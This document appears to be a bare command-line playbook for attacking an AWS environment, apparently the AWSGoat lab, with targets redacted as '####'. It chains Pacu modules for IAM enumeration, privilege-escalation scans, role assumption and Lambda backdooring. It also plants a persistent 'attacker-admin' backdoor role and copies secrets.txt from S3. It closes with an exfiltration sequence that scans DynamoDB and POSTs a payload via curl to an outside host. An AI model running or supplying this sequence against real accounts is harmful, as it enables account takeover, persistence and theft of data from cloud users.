#---------------------------#
# IAM Enumeration
#---------------------------#
pacu exec iam__enum_permissions --role-name ####

# Example exposure
cat << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "iam:*",
    "Resource": "*"
  }]
}
EOF

#---------------------------#
# Privilege Escalation Scan
#---------------------------#
pacu exec iam__privesc_scan --role-name awsgoat-lambda-exec

# PassRole misconfig
cat << 'EOF'
{
  "Action": "iam:PassRole",
  "Resource": "arn:aws:iam::####:role/LambdaExecRole"
}
EOF

#---------------------------#
# AssumeRole Pivot
#---------------------------#
pacu exec iam__assume_role --role-arn arn:aws:iam::####:role/####

#---------------------------#
# S3 Enumeration + Exfil
#---------------------------#
pacu exec s3__enum --bucket ####
aws s3 cp s3://####/secrets.txt .

# Public ACL example
cat << 'EOF'
<AccessControlPolicy>
  <AccessControlList>
    <Grant>
      <Permission>READ</Permission>
      <Grantee>AllUsers</Grantee>
    </Grant>
  </AccessControlList>
</AccessControlPolicy>
EOF

#---------------------------#
# Lambda → EC2 Exploit
#---------------------------#
pacu exec lambda__backdoor_new \
  --function #### \
  --payload '{ "cmd": "####" }'

# Event trigger example
cat << 'EOF'
{
  "source": "aws.s3",
  "detail": { "object": { "key": "####" } }
}
EOF

#---------------------------#
# API Gateway Recon
#---------------------------#
curl -i -X GET "https://####.execute-api.us-east-1.amazonaws.com/prod/api/v1/####" \
  -H "Authorization: ####"

# Public resource policy misconfiguration
cat << 'EOF'
{
  "Effect": "Allow",
  "Principal": "*",
  "Action": "execute-api:Invoke",
  "Resource": "arn:aws:execute-api:####:*/*/*"
}
EOF

#---------------------------#
# Persistence Technique
#---------------------------#
pacu exec iam__backdoor_role \
  --role-name attacker-admin \
  --permissions admin

#----------------------------------------#
# Exfiltration Chain (Example Sequence)
#----------------------------------------#
aws sts get-caller-identity
aws s3 ls s3://####
aws dynamodb scan --table-name ####
curl -X POST http://#### --data "payload=####"
